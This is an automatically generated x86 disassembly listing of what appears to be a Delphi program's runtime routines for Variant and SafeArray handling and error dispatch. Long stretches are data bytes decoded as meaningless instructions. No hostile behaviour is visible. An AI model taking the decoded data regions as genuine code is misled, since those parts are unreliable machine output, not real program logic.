add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
fld [ eax ]
or al 0x0
fld [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23 ] dh
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
popad
outsb
je r-xdata
shr [ eax + 0x40dc ] 0x0
add [ eax ] al
add [ eax ] al
xor [ eax ] eax
call 0x24411baa
xor al [ eax ]
push ss
inc eax
add [ eax ] al
add [ eax ] al
outsd
add [ eax ] al
cwde
jne r-xdata
inc eax
add [ eax + eax ] cl
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xde
outsd
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 8 ] bh
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xdd
inc eax
add [ eax + eax ] cl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 8 + 0xc0040 ] cl
fld [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc eax
add [ edx + esi ] ah
inc eax
add [ 0x72615645 ] dl
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
jb r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
jb r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
rcl ah 0xdd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24411d9e
xor al [ eax ]
inc eax
je r-xdata
popad
inc eax
add [ eax ] cl
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or bh bl
inc eax
add [ eax + eax ] cl
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
cwde
jne r-xdata
add [ eax ] al
add [ esp + esi + 0x40 ] ah
int3
dec bp
insd
outsd
jb r-xdata
int3
outsd
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24411ed2
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
jb r-xdata
add ah cl
xor [ eax ] eax
call 0x24411e6a
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
fild [ eax ]
or al 0x0
inc ebp
jb r-xdata
add ah cl
xor [ eax ] eax
call 0x24411f36
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
inc eax
insd
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
outsb
je r-xdata
popad
outsb
je r-xdata
jo r-xdata
popad
je r-xdata
add [ eax ] al
cwde
jne r-xdata
inc eax
add [ esi + ebx * 8 + 0x40 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
fiadd [ eax ]
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 8 + 0xc0040 ] ah
outsd
jb r-xdata
push ebp
push r-xdata
push [ fs : eax ]
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24412002
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
jae r-xdata
popad
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ edx + esi ] ah
inc eax
add [ 0x72615645 ] dl
outsb
js r-xdata
add ah cl
xor [ eax ] eax
call 0x24411f9e
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
xor al 0x40
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ esi + ebx * 8 ] bh
inc eax
add esp 0xffffffe4
push ebx
je r-xdata
je r-xdata
inc eax
add [ eax - 0x21 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x21 ] dh
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jne r-xdata
outsd
jb r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fd30
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fd30
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
dec ebp
in al 0x8b
mov ebx eax
popad
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
aam 0xdf
inc eax
add [ eax ] al
add [ eax ] al
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
fild [ eax ]
or al 0x0
outsd
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e03d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
jns r-xdata
add [ esp + esi + 0x40 ] ch
xor al 0x40
add [ eax ] al
cwde
jne r-xdata
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xdf
inc eax
add [ eax + eax ] cl
sub_40dfec
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e03d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40e040
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fd30
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fd30
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
sub_40e0dc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e12d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40e130
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fd30
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fd30
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1c6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f90
retn
sub_40e1cc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e21d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40e220
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e46c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f90
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
dec eax
je r-xdata
call sub_40dfec
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
jmp r-xdata
call sub_40e0dc
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40aa98
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2dc
call sub_4039a8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
jmp r-xdata
jmp r-xdata
sub_40e480
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e040
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e130
jmp r-xdata
jmp r-xdata
call sub_40e220
sub_40e4b4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e505
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40e51c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e54c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e54c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e5a8
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e474
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e474
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e51c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e474
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e474
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e54c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e474
mov eax [ ebp - 0x314 ]
call sub_40e7a0
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e724
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e474
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f6c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41018c
test al al
je r-xdata
mov eax ebx
call sub_40e5a8
jmp r-xdata
push ebx
call VariantClear
call sub_40e474
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e7bc
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e7ec
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e7ec
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e848
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e474
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e474
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e7a0
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e1cc
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e474
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e474
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e7bc
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e7ec
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e474
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e474
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea1c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e724
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e474
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403fc0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41018c
test al al
je r-xdata
mov ecx sub_40ea14
mov edx esi
mov eax ebx
call sub_40e848
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e474
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eac8
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ea1c
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e724
sub_40eb0c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40464c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e480
pop ebx
pop ebp
retn 0x8
sub_40eb44
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40464c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e480
pop ebx
pop ebp
retn 0x8
sub_40eb7c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40464c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e480
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec39
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4041f4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407a68
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404798
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4041f4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407a2c
mov edx [ ebp - 0xc ]
